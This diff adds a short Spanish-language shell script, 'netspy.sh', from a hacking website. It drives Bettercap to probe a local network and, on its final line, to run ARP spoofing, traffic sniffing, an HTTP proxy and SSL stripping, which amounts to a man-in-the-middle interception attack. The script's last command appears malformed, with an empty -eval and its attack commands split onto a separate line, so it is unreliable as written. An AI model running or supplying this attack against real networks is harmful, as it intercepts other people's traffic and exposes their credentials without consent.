@@ -1,0 +1,29 @@
+
+cat << "INFO"
+             _                   
+            | |                  
+  _ __   ___| |_ ___ _ __  _   _ 
+ | '_ \ / _ \ __/ __| '_ \| | | |
+ | | | |  __/ |_\__ \ |_) | |_| |
+ |_| |_|\___|\__|___/ .__/ \__, |
+                    | |     __/ |
+                    |_|    |___/  v1.0
+                    
+             www.hackingyseguridad.com
+             
+INFO
+if [ -z "$1" ]; then
+        echo 
+        echo "Captura y muestra en pantalla el trafico."
+        echo "Requiere Bettercap release >2.9"
+        echo "Uso.: sh netspy.sh <interface>"
+        echo 
+        exit 0
+fi
+echo
+echo
+#netdiscover -i $1
+bettercap -iface $1 -eval "net.probe on; ticker on "
+bettercap -iface $1 -eval 
+
+net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on; http.proxy on; set http.proxy.sslstrip true
